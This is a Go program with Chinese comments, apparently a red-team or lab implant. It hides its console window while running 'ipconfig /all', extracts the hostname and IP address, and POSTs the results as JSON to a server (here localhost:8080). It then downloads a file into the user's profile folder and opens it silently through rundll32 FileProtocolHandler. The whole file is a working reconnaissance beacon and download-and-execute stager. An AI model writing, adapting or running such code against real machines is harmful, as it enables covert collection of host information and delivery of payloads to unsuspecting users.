package main

import (
	"encoding/json"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"syscall"

	"golang.org/x/text/encoding/simplifiedchinese"
)

// 使用 GBK 解码
func DecodeWithGbk(data []byte) string {
	// 使用 GBK 解码
	dec := simplifiedchinese.GBK.NewDecoder()
	out, _ := dec.Bytes(data)
	return string(out)
}

// 获取本机IPCONFIG信息
func GetLocalIpconfig() map[string]string {
	// get_ip_config_cmd := "ipconfig /all"
	// cmd := exec.Command("cmd", "/C", get_ip_config_cmd)
	cmd := exec.Command("ipconfig", "/all")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	// output, err := cmd.StdoutPipe()
	output, err := cmd.Output()

	if err != nil {
		// fmt.Println(err)
		return nil
	}
	// 将 output 使用 GBK 解码
	output_str_gbk := DecodeWithGbk(output)
	// fmt.Println(output_str_gbk)

	// 根据 output 提取感兴趣的信息
	info_map := make(map[string]string)
	info_map["ipconfig"] = output_str_gbk
	// 逐行读取并处理 output_str_gbk, 提取感兴趣的信息
	for _, line := range strings.Split(output_str_gbk, "\n") {
		if strings.Contains(line, "主机名") {
			hostname := strings.Split(line, ":")[1]
			info_map["hostname"] = strings.TrimSpace(hostname)
		}
		if strings.Contains(line, "IPv4 地址") {
			ip := strings.Split(line, ":")[1]
			info_map["ip"] += strings.TrimSpace(ip)
		}
	}
	return info_map
}

// 将 map 类型的数据转换成 json 格式
func MapToJson(info_map map[string]string) (string, error) {
	json_data, err := json.Marshal(info_map)
	if err != nil {
		return "", err
	}
	return string(json_data), nil
}

// 将 json 格式的数据 post 到指定的 URL
func PostJsonData(url string, json_data string) error {
	// println(json_data)
	resp, err := http.Post(url, "application/json", strings.NewReader(json_data))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

// 下载并打开文件
func DownloadAndOpenFile(url string) {
	// 获取当前用户目录
	home := os.Getenv("USERPROFILE")
	// 匹配 url ?filename= 后的文件名
	fileNameInURL := strings.Split(url, "?filename=")[1]
	filePathInURL := home + "/" + fileNameInURL
	// 如果文件已存在, 直接打开
	if _, err := os.Stat(filePathInURL); err == nil {
		exec.Command("rundll32.exe", "url.dll,FileProtocolHandler", filePathInURL).Start()
		return
	}
	// 下载文件
	resp, err := http.Get(url)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	// 打印响应体
	// fmt.Println(resp.Body)
	// 打印响应头
	// fmt.Printf("响应头: %v\n", resp.Header)

	// 从响应头的 filename 获取文件名
	filename := resp.Header.Get("filename")
	filePath := home + "/" + filename
	// fmt.Printf("已下载文件: %s\n", filename)
	// 创建文件
	file, err := os.Create(filePath)
	// fmt.Println(home + "/" + filename)
	if err != nil {
		return
	}
	defer file.Close()
	// 将下载的内容写入文件
	io.Copy(file, resp.Body)
	// 调用系统默认应用打开文件
	// cmd := exec.Command("cmd", "/C", "start", "file:///"+home+"/"+filename)
	exec.Command("rundll32.exe", "url.dll,FileProtocolHandler", filePath).Start()
}

func main() {
	// 获取本机IP
	ipconfig := GetLocalIpconfig()
	// GetLocalIpconfig()
	// 将 map 类型的 ipconfig 转换成 json 格式以便作为请求体发送
	ipconfig_json, err := MapToJson(ipconfig)
	// fmt.Println(ipconfig_json)
	if err != nil {
		return
	}
	server_socket := "127.0.0.1:8080"
	target_url := "http://" + server_socket + "/ipconfig"
	// 发送请求
	PostJsonData(target_url, ipconfig_json)
	// 下载并打开文件 AtomicRedTeam.pdf
	DownloadAndOpenFile("http://" + server_socket + "/download?filename=xxx.pdf")
}
